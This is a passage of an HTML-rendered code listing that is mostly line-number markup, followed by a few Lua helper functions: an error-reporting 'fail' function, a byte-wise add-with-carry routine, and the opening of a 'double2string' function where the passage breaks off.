<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
<span class='line-number'>354</span>
<span class='line-number'>355</span>
<span class='line-number'>356</span>
<span class='line-number'>357</span>
<span class='line-number'>358</span>
<span class='line-number'>359</span>
<span class='line-number'>360</span>
<span class='line-number'>361</span>
<span class='line-number'>362</span>
<span class='line-number'>363</span>
<span class='line-number'>364</span>
<span class='line-number'>365</span>
<span class='line-number'>366</span>
<span class='line-number'>367</span>
<span class='line-number'>368</span>
<span class='line-number'>369</span>
<span class='line-number'>370</span>
<span class='line-number'>371</span>
<span class='line-number'>372</span>
<span class='line-number'>373</span>
<span class='line-number'>374</span>
<span class='line-number'>375</span>
<span class='line-number'>376</span>
<span class='line-number'>377</span>
<span class='line-number'>378</span>
<span class='line-number'>379</span>
<span class='line-number'>380</span>
<span class='line-number'>381</span>
<span class='line-number'>382</span>
<span class='line-number'>383</span>
<span class='line-number'>384</span>
<span class='line-number'>385</span>
<span class='line-number'>386</span>
<span class='line-number'>387</span>
<span class='line-number'>388</span>
<span class='line-number'>389</span>
<span class='line-number'>390</span>
<span class='line-number'>391</span>
<span class='line-number'>392</span>
<span class='line-number'>393</span>
<span class='line-number'>394</span>
<span class='line-number'>395</span>
<span class='line-number'>396</span>
<span class='line-number'>397</span>
<span class='line-number'>398</span>
<span class='line-number'>399</span>
<span class='line-number'>400</span>
<span class='line-number'>401</span>
<span class='line-number'>402</span>
<span class='line-number'>403</span>
<span class='line-number'>404</span>
<span class='line-number'>405</span>
<span class='line-number'>406</span>
<span class='line-number'>407</span>
<span class='line-number'>408</span>
<span class='line-number'>409</span>
<span class='line-number'>410</span>
<span class='line-number'>411</span>
<span class='line-number'>412</span>
<span class='line-number'>413</span>
<span class='line-number'>414</span>
<span class='line-number'>415</span>
<span class='line-number'>416</span>
<span class='line-number'>417</span>
<span class='line-number'>418</span>
<span class='line-number'>419</span>
<span class='line-number'>420</span>
<span class='line-number'>421</span>
<span class='line-number'>422</span>
<span class='line-number'>423</span>
<span class='line-number'>424</span>
<span class='line-number'>425</span>
<span class='line-number'>426</span>
<span class='line-number'>427</span>
<span class='line-number'>428</span>
<span class='line-number'>429</span>
<span class='line-number'>430</span>
<span class='line-number'>431</span>
<span class='line-number'>432</span>
<span class='line-number'>433</span>
<span class='line-number'>434</span>
<span class='line-number'>435</span>
<span class='line-number'>436</span>
<span class='line-number'>437</span>
<span class='line-number'>438</span>
<span class='line-number'>439</span>
<span class='line-number'>440</span>
<span class='line-number'>441</span>
<span class='line-number'>442</span>
<span class='line-number'>443</span>
<span class='line-number'>444</span>
<span class='line-number'>445</span>
<span class='line-number'>446</span>
<span class='line-number'>447</span>
<span class='line-number'>448</span>
<span class='line-number'>449</span>
<span class='line-number'>450</span>
<span class='line-number'>451</span>
<span class='line-number'>452</span>
<span class='line-number'>453</span>
<span class='line-number'>454</span>
<span class='line-number'>455</span>
<span class='line-number'>456</span>
<span class='line-number'>457</span>
<span class='line-number'>458</span>
<span class='line-number'>459</span>
<span class='line-number'>460</span>
<span class='line-number'>461</span>
<span class='line-number'>462</span>
<span class='line-number'>463</span>
<span class='line-number'>464</span>
<span class='line-number'>465</span>
<span class='line-number'>466</span>
<span class='line-number'>467</span>
<span class='line-number'>468</span>
<span class='line-number'>469</span>
<span class='line-number'>470</span>
<span class='line-number'>471</span>
<span class='line-number'>472</span>
<span class='line-number'>473</span>
<span class='line-number'>474</span>
<span class='line-number'>475</span>
<span class='line-number'>476</span>
<span class='line-number'>477</span>
<span class='line-number'>478</span>
<span class='line-number'>479</span>
<span class='line-number'>480</span>
<span class='line-number'>481</span>
<span class='line-number'>482</span>
<span class='line-number'>483</span>
<span class='line-number'>484</span>
<span class='line-number'>485</span>
<span class='line-number'>486</span>
<span class='line-number'>487</span>
<span class='line-number'>488</span>
<span class='line-number'>489</span>
<span class='line-number'>490</span>
<span class='line-number'>491</span>
<span class='line-number'>492</span>
<span class='line-number'>493</span>
<span class='line-number'>494</span>
<span class='line-number'>495</span>
<span class='line-number'>496</span>
<span class='line-number'>497</span>
<span class='line-number'>498</span>
<span class='line-number'>499</span>
<span class='line-number'>500</span>
<span class='line-number'>501</span>
<span class='line-number'>502</span>
<span class='line-number'>503</span>
<span class='line-number'>504</span>
<span class='line-number'>505</span>
<span class='line-number'>506</span>
<span class='line-number'>507</span>
<span class='line-number'>508</span>
<span class='line-number'>509</span>
<span class='line-number'>510</span>
<span class='line-number'>511</span>
<span class='line-number'>512</span>
<span class='line-number'>513</span>
<span class='line-number'>514</span>
<span class='line-number'>515</span>
<span class='line-number'>516</span>
<span class='line-number'>517</span>
<span class='line-number'>518</span>
<span class='line-number'>519</span>
<span class='line-number'>520</span>
<span class='line-number'>521</span>
<span class='line-number'>522</span>
<span class='line-number'>523</span>
<span class='line-number'>524</span>
<span class='line-number'>525</span>
<span class='line-number'>526</span>
<span class='line-number'>527</span>
<span class='line-number'>528</span>
<span class='line-number'>529</span>
<span class='line-number'>530</span>
<span class='line-number'>531</span>
<span class='line-number'>532</span>
<span class='line-number'>533</span>
<span class='line-number'>534</span>
<span class='line-number'>535</span>
<span class='line-number'>536</span>
<span class='line-number'>537</span>
<span class='line-number'>538</span>
<span class='line-number'>539</span>
<span class='line-number'>540</span>
<span class='line-number'>541</span>
<span class='line-number'>542</span>
<span class='line-number'>543</span>
<span class='line-number'>544</span>
<span class='line-number'>545</span>
<span class='line-number'>546</span>
<span class='line-number'>547</span>
<span class='line-number'>548</span>
<span class='line-number'>549</span>
<span class='line-number'>550</span>
<span class='line-number'>551</span>
<span class='line-number'>552</span>
<span class='line-number'>553</span>
<span class='line-number'>554</span>
<span class='line-number'>555</span>
<span class='line-number'>556</span>
<span class='line-number'>557</span>
<span class='line-number'>558</span>
<span class='line-number'>559</span>
<span class='line-number'>560</span>
<span class='line-number'>561</span>
<span class='line-number'>562</span>
<span class='line-number'>563</span>
<span class='line-number'>564</span>
<span class='line-number'>565</span>
<span class='line-number'>566</span>
<span class='line-number'>567</span>
<span class='line-number'>568</span>
<span class='line-number'>569</span>
<span class='line-number'>570</span>
<span class='line-number'>571</span>
<span class='line-number'>572</span>
<span class='line-number'>573</span>
<span class='line-number'>574</span>
<span class='line-number'>575</span>
<span class='line-number'>576</span>
<span class='line-number'>577</span>
<span class='line-number'>578</span>
<span class='line-number'>579</span>
<span class='line-number'>580</span>
<span class='line-number'>581</span>
<span class='line-number'>582</span>
<span class='line-number'>583</span>
<span class='line-number'>584</span>
<span class='line-number'>585</span>
<span class='line-number'>586</span>
<span class='line-number'>587</span>
<span class='line-number'>588</span>
<span class='line-number'>589</span>
<span class='line-number'>590</span>
<span class='line-number'>591</span>
<span class='line-number'>592</span>
<span class='line-number'>593</span>
<span class='line-number'>594</span>
<span class='line-number'>595</span>
<span class='line-number'>596</span>
<span class='line-number'>597</span>
<span class='line-number'>598</span>
<span class='line-number'>599</span>
<span class='line-number'>600</span>
<span class='line-number'>601</span>
<span class='line-number'>602</span>
<span class='line-number'>603</span>
<span class='line-number'>604</span>
<span class='line-number'>605</span>
<span class='line-number'>606</span>
<span class='line-number'>607</span>
<span class='line-number'>608</span>
<span class='line-number'>609</span>
<span class='line-number'>610</span>
<span class='line-number'>611</span>
<span class='line-number'>612</span>
<span class='line-number'>613</span>
<span class='line-number'>614</span>
<span class='line-number'>615</span>
<span class='line-number'>616</span>
<span class='line-number'>617</span>
<span class='line-number'>618</span>
<span class='line-number'>619</span>
<span class='line-number'>620</span>
<span class='line-number'>621</span>
<span class='line-number'>622</span>
<span class='line-number'>623</span>
<span class='line-number'>624</span>
<span class='line-number'>625</span>
<span class='line-number'>626</span>
<span class='line-number'>627</span>
<span class='line-number'>628</span>
<span class='line-number'>629</span>
<span class='line-number'>630</span>
<span class='line-number'>631</span>
<span class='line-number'>632</span>
<span class='line-number'>633</span>
<span class='line-number'>634</span>
<span class='line-number'>635</span>
<span class='line-number'>636</span>
<span class='line-number'>637</span>
<span class='line-number'>638</span>
<span class='line-number'>639</span>
<span class='line-number'>640</span>
<span class='line-number'>641</span>
<span class='line-number'>642</span>
<span class='line-number'>643</span>
<span class='line-number'>644</span>
<span class='line-number'>645</span>
<span class='line-number'>646</span>
<span class='line-number'>647</span>
<span class='line-number'>648</span>
<span class='line-number'>649</span>
<span class='line-number'>650</span>
<span class='line-number'>651</span>
<span class='line-number'>652</span>
<span class='line-number'>653</span>
<span class='line-number'>654</span>
<span class='line-number'>655</span>
<span class='line-number'>656</span>
<span class='line-number'>657</span>
<span class='line-number'>658</span>
<span class='line-number'>659</span>
<span class='line-number'>660</span>
<span class='line-number'>661</span>
<span class='line-number'>662</span>
<span class='line-number'>663</span>
<span class='line-number'>664</span>
<span class='line-number'>665</span>
<span class='line-number'>666</span>
<span class='line-number'>667</span>
<span class='line-number'>668</span>
<span class='line-number'>669</span>
<span class='line-number'>670</span>
<span class='line-number'>671</span>
<span class='line-number'>672</span>
<span class='line-number'>673</span>
<span class='line-number'>674</span>
<span class='line-number'>675</span>
<span class='line-number'>676</span>
<span class='line-number'>677</span>
<span class='line-number'>678</span>
<span class='line-number'>679</span>
<span class='line-number'>680</span>
<span class='line-number'>681</span>
<span class='line-number'>682</span>
<span class='line-number'>683</span>
<span class='line-number'>684</span>
<span class='line-number'>685</span>
<span class='line-number'>686</span>
<span class='line-number'>687</span>
<span class='line-number'>688</span>
<span class='line-number'>689</span>
<span class='line-number'>690</span>
<span class='line-number'>691</span>
<span class='line-number'>692</span>
<span class='line-number'>693</span>
<span class='line-number'>694</span>
<span class='line-number'>695</span>
<span class='line-number'>696</span>
<span class='line-number'>697</span>
<span class='line-number'>698</span>
<span class='line-number'>699</span>
<span class='line-number'>700</span>
<span class='line-number'>701</span>
<span class='line-number'>702</span>
<span class='line-number'>703</span>
<span class='line-number'>704</span>
<span class='line-number'>705</span>
<span class='line-number'>706</span>
<span class='line-number'>707</span>
<span class='line-number'>708</span>
<span class='line-number'>709</span>
<span class='line-number'>710</span>
<span class='line-number'>711</span>
<span class='line-number'>712</span>
<span class='line-number'>713</span>
<span class='line-number'>714</span>
<span class='line-number'>715</span>
<span class='line-number'>716</span>
<span class='line-number'>717</span>
<span class='line-number'>718</span>
<span class='line-number'>719</span>
<span class='line-number'>720</span>
<span class='line-number'>721</span>
<span class='line-number'>722</span>
<span class='line-number'>723</span>
<span class='line-number'>724</span>
<span class='line-number'>725</span>
<span class='line-number'>726</span>
<span class='line-number'>727</span>
<span class='line-number'>728</span>
<span class='line-number'>729</span>
<span class='line-number'>730</span>
<span class='line-number'>731</span>
<span class='line-number'>732</span>
<span class='line-number'>733</span>
<span class='line-number'>734</span>
<span class='line-number'>735</span>
<span class='line-number'>736</span>
<span class='line-number'>737</span>
<span class='line-number'>738</span>
<span class='line-number'>739</span>
<span class='line-number'>740</span>
<span class='line-number'>741</span>
<span class='line-number'>742</span>
<span class='line-number'>743</span>
<span class='line-number'>744</span>
<span class='line-number'>745</span>
<span class='line-number'>746</span>
<span class='line-number'>747</span>
<span class='line-number'>748</span>
<span class='line-number'>749</span>
<span class='line-number'>750</span>
<span class='line-number'>751</span>
<span class='line-number'>752</span>
<span class='line-number'>753</span>
<span class='line-number'>754</span>
<span class='line-number'>755</span>
<span class='line-number'>756</span>
<span class='line-number'>757</span>
<span class='line-number'>758</span>
<span class='line-number'>759</span>
<span class='line-number'>760</span>
<span class='line-number'>761</span>
<span class='line-number'>762</span>
<span class='line-number'>763</span>
<span class='line-number'>764</span>
<span class='line-number'>765</span>
<span class='line-number'>766</span>
<span class='line-number'>767</span>
<span class='line-number'>768</span>
<span class='line-number'>769</span>
<span class='line-number'>770</span>
<span class='line-number'>771</span>
<span class='line-number'>772</span>
<span class='line-number'>773</span>
<span class='line-number'>774</span>
<span class='line-number'>775</span>
<span class='line-number'>776</span>
<span class='line-number'>777</span>
<span class='line-number'>778</span>
<span class='line-number'>779</span>
<span class='line-number'>780</span>
<span class='line-number'>781</span>
<span class='line-number'>782</span>
<span class='line-number'>783</span>
<span class='line-number'>784</span>
<span class='line-number'>785</span>
<span class='line-number'>786</span>
<span class='line-number'>787</span>
<span class='line-number'>788</span>
<span class='line-number'>789</span>
<span class='line-number'>790</span>
<span class='line-number'>791</span>
<span class='line-number'>792</span>
<span class='line-number'>793</span>
<span class='line-number'>794</span>
<span class='line-number'>795</span>
<span class='line-number'>796</span>
<span class='line-number'>797</span>
<span class='line-number'>798</span>
<span class='line-number'>799</span>
<span class='line-number'>800</span>
<span class='line-number'>801</span>
<span class='line-number'>802</span>
<span class='line-number'>803</span>
<span class='line-number'>804</span>
<span class='line-number'>805</span>
<span class='line-number'>806</span>
<span class='line-number'>807</span>
<span class='line-number'>808</span>
<span class='line-number'>809</span>
<span class='line-number'>810</span>
<span class='line-number'>811</span>
<span class='line-number'>812</span>
<span class='line-number'>813</span>
<span class='line-number'>814</span>
<span class='line-number'>815</span>
<span class='line-number'>816</span>
<span class='line-number'>817</span>
<span class='line-number'>818</span>
<span class='line-number'>819</span>
<span class='line-number'>820</span>
<span class='line-number'>821</span>
<span class='line-number'>822</span>
<span class='line-number'>823</span>
<span class='line-number'>824</span>
<span class='line-number'>825</span>
<span class='line-number'>826</span>
<span class='line-number'>827</span>
<span class='line-number'>828</span>
<span class='line-number'>829</span>
<span class='line-number'>830</span>
<span class='line-number'>831</span>
<span class='line-number'>832</span>
<span class='line-number'>833</span>
<span class='line-number'>834</span>
<span class='line-number'>835</span>
<span class='line-number'>836</span>
<span class='line-number'>837</span>
<span class='line-number'>838</span>
<span class='line-number'>839</span>
<span class='line-number'>840</span>
<span class='line-number'>841</span>
<span class='line-number'>842</span>
<span class='line-number'>843</span>
<span class='line-number'>844</span>
<span class='line-number'>845</span>
<span class='line-number'>846</span>
<span class='line-number'>847</span>
<span class='line-number'>848</span>
<span class='line-number'>849</span>
<span class='line-number'>850</span>
<span class='line-number'>851</span>
<span class='line-number'>852</span>
<span class='line-number'>853</span>
<span class='line-number'>854</span>
<span class='line-number'>855</span>
<span class='line-number'>856</span>
<span class='line-number'>857</span>
<span class='line-number'>858</span>
<span class='line-number'>859</span>
<span class='line-number'>860</span>
<span class='line-number'>861</span>
<span class='line-number'>862</span>
<span class='line-number'>863</span>
<span class='line-number'>864</span>
<span class='line-number'>865</span>
<span class='line-number'>866</span>
<span class='line-number'>867</span>
<span class='line-number'>868</span>
<span class='line-number'>869</span>
<span class='line-number'>870</span>
<span class='line-number'>871</span>
<span class='line-number'>872</span>
<span class='line-number'>873</span>
<span class='line-number'>874</span>
<span class='line-number'>875</span>
<span class='line-number'>876</span>
<span class='line-number'>877</span>
<span class='line-number'>878</span>
<span class='line-number'>879</span>
<span class='line-number'>880</span>
<span class='line-number'>881</span>
<span class='line-number'>882</span>
<span class='line-number'>883</span>
<span class='line-number'>884</span>
<span class='line-number'>885</span>
<span class='line-number'>886</span>
<span class='line-number'>887</span>
<span class='line-number'>888</span>
<span class='line-number'>889</span>
<span class='line-number'>890</span>
<span class='line-number'>891</span>
<span class='line-number'>892</span>
<span class='line-number'>893</span>
<span class='line-number'>894</span>
<span class='line-number'>895</span>
<span class='line-number'>896</span>
<span class='line-number'>897</span>
<span class='line-number'>898</span>
<span class='line-number'>899</span>
<span class='line-number'>900</span>
<span class='line-number'>901</span>
<span class='line-number'>902</span>
<span class='line-number'>903</span>
<span class='line-number'>904</span>
<span class='line-number'>905</span>
<span class='line-number'>906</span>
<span class='line-number'>907</span>
<span class='line-number'>908</span>
<span class='line-number'>909</span>
<span class='line-number'>910</span>
<span class='line-number'>911</span>
<span class='line-number'>912</span>
<span class='line-number'>913</span>
<span class='line-number'>914</span>
<span class='line-number'>915</span>
<span class='line-number'>916</span>
<span class='line-number'>917</span>
<span class='line-number'>918</span>
<span class='line-number'>919</span>
<span class='line-number'>920</span>
<span class='line-number'>921</span>
<span class='line-number'>922</span>
<span class='line-number'>923</span>
<span class='line-number'>924</span>
<span class='line-number'>925</span>
<span class='line-number'>926</span>
<span class='line-number'>927</span>
<span class='line-number'>928</span>
<span class='line-number'>929</span>
<span class='line-number'>930</span>
<span class='line-number'>931</span>
<span class='line-number'>932</span>
<span class='line-number'>933</span>
<span class='line-number'>934</span>
<span class='line-number'>935</span>
<span class='line-number'>936</span>
<span class='line-number'>937</span>
<span class='line-number'>938</span>
<span class='line-number'>939</span>
<span class='line-number'>940</span>
<span class='line-number'>941</span>
<span class='line-number'>942</span>
<span class='line-number'>943</span>
<span class='line-number'>944</span>
<span class='line-number'>945</span>
<span class='line-number'>946</span>
<span class='line-number'>947</span>
<span class='line-number'>948</span>
<span class='line-number'>949</span>
<span class='line-number'>950</span>
<span class='line-number'>951</span>
<span class='line-number'>952</span>
<span class='line-number'>953</span>
<span class='line-number'>954</span>
<span class='line-number'>955</span>
<span class='line-number'>956</span>
<span class='line-number'>957</span>
<span class='line-number'>958</span>
<span class='line-number'>959</span>
<span class='line-number'>960</span>
<span class='line-number'>961</span>
<span class='line-number'>962</span>
<span class='line-number'>963</span>
<span class='line-number'>964</span>
<span class='line-number'>965</span>
<span class='line-number'>966</span>
<span class='line-number'>967</span>
<span class='line-number'>968</span>
<span class='line-number'>969</span>
<span class='line-number'>970</span>
<span class='line-number'>971</span>
<span class='line-number'>972</span>
<span class='line-number'>973</span>
<span class='line-number'>974</span>
<span class='line-number'>975</span>
<span class='line-number'>976</span>
<span class='line-number'>977</span>
<span class='line-number'>978</span>
<span class='line-number'>979</span>
<span class='line-number'>980</span>
<span class='line-number'>981</span>
<span class='line-number'>982</span>
<span class='line-number'>983</span>
<span class='line-number'>984</span>
<span class='line-number'>985</span>
<span class='line-number'>986</span>
<span class='line-number'>987</span>
<span class='line-number'>988</span>
<span class='line-number'>989</span>
<span class='line-number'>990</span>
<span class='line-number'>991</span>
<span class='line-number'>992</span>
<span class='line-number'>993</span>
<span class='line-number'>994</span>
<span class='line-number'>995</span>
<span class='line-number'>996</span>
<span class='line-number'>997</span>
<span class='line-number'>998</span>
<span class='line-number'>999</span>
<span class='line-number'>1000</span>
<span class='line-number'>1001</span>
<span class='line-number'>1002</span>
<span class='line-number'>1003</span>
<span class='line-number'>1004</span>
<span class='line-number'>1005</span>
<span class='line-number'>1006</span>
<span class='line-number'>1007</span>
<span class='line-number'>1008</span>
<span class='line-number'>1009</span>
<span class='line-number'>1010</span>
<span class='line-number'>1011</span>
<span class='line-number'>1012</span>
<span class='line-number'>1013</span>
<span class='line-number'>1014</span>
<span class='line-number'>1015</span>
<span class='line-number'>1016</span>
<span class='line-number'>1017</span>
<span class='line-number'>1018</span>
<span class='line-number'>1019</span>
<span class='line-number'>1020</span>
<span class='line-number'>1021</span>
<span class='line-number'>1022</span>
<span class='line-number'>1023</span>
<span class='line-number'>1024</span>
<span class='line-number'>1025</span>
<span class='line-number'>1026</span>
<span class='line-number'>1027</span>
<span class='line-number'>1028</span>
<span class='line-number'>1029</span>
<span class='line-number'>1030</span>
<span class='line-number'>1031</span>
<span class='line-number'>1032</span>
<span class='line-number'>1033</span>
<span class='line-number'>1034</span>
<span class='line-number'>1035</span>
<span class='line-number'>1036</span>
<span class='line-number'>1037</span>
<span class='line-number'>1038</span>
<span class='line-number'>1039</span>
<span class='line-number'>1040</span>
<span class='line-number'>1041</span>
<span class='line-number'>1042</span>
<span class='line-number'>1043</span>
<span class='line-number'>1044</span>
<span class='line-number'>1045</span>
<span class='line-number'>1046</span>
<span class='line-number'>1047</span>
<span class='line-number'>1048</span>
<span class='line-number'>1049</span>
<span class='line-number'>1050</span>
<span class='line-number'>1051</span>
<span class='line-number'>1052</span>
<span class='line-number'>1053</span>
<span class='line-number'>1054</span>
<span class='line-number'>1055</span>
<span class='line-number'>1056</span>
<span class='line-number'>1057</span>
<span class='line-number'>1058</span>
<span class='line-number'>1059</span>
<span class='line-number'>1060</span>
<span class='line-number'>1061</span>
<span class='line-number'>1062</span>
<span class='line-number'>1063</span>
<span class='line-number'>1064</span>
<span class='line-number'>1065</span>
<span class='line-number'>1066</span>
<span class='line-number'>1067</span>
<span class='line-number'>1068</span>
<span class='line-number'>1069</span>
<span class='line-number'>1070</span>
<span class='line-number'>1071</span>
<span class='line-number'>1072</span>
<span class='line-number'>1073</span>
<span class='line-number'>1074</span>
<span class='line-number'>1075</span>
<span class='line-number'>1076</span>
<span class='line-number'>1077</span>
<span class='line-number'>1078</span>
<span class='line-number'>1079</span>
<span class='line-number'>1080</span>
<span class='line-number'>1081</span>
<span class='line-number'>1082</span>
<span class='line-number'>1083</span>
<span class='line-number'>1084</span>
<span class='line-number'>1085</span>
<span class='line-number'>1086</span>
<span class='line-number'>1087</span>
<span class='line-number'>1088</span>
</pre></td><td class='code'><pre><code class='lua'><span class='line'><span class="kd">local</span> <span class="n">fail</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[-] &quot;</span> <span class="o">..</span> <span class="n">msg</span><span class="p">)</span>
</span><span class='line'>  <span class="nb">error</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">addbyte</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">byte</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">carry</span> <span class="o">=</span> <span class="n">byte</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">&#39;</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">cb</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">carry</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">cb</span> <span class="o">&gt;=</span> <span class="mi">256</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">carry</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">cb</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">double2string</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
